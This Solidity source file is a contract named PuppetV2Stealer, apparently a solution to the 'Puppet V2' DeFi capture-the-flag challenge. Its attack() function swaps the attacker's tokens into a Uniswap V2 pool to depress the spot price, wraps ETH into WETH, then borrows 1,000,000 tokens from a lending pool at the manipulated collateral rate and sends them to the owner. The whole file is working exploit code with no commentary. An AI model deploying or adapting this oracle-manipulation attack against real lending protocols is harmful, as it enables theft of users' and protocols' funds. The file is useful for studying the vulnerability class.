pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol";

interface IPuppetV2 {
  function borrow(uint256 borrowAmount) external;
  function calculateDepositOfWETHRequired(uint256 tokenAmount) external view returns (uint256);
}

contract PuppetV2Stealer {
  using Address for address;

  IPuppetV2 immutable puppet;
  IUniswapV2Router01 immutable router;
  IERC20 immutable token;
  IERC20 immutable WETH;
  address owner;

  constructor(IPuppetV2 _puppet, IERC20 _token, IUniswapV2Router01 _router, IERC20 _WETH, address _owner) {
    puppet = _puppet;
    token = _token;
    router = _router;
    WETH = _WETH;
    owner = _owner;
    _WETH.approve(address(_router), type(uint).max);
    _WETH.approve(address(_puppet), type(uint).max);
    _token.approve(address(_router), type(uint).max);
  }

  function attack(uint amount) external payable {
    token.transferFrom(owner, address(this), amount);
    address[] memory path = new address[](2);
    path[0]=address(token);
    path[1]=address(WETH);
    router.swapExactTokensForTokens(
      amount,
      0,
      path,
      address(this),
      type(uint32).max
    );

    address(WETH).functionCallWithValue(
      abi.encodeWithSignature("deposit()"),
      msg.value
    );

    puppet.borrow(1000000e18);
    token.transfer(owner, 1000000e18);
  }
}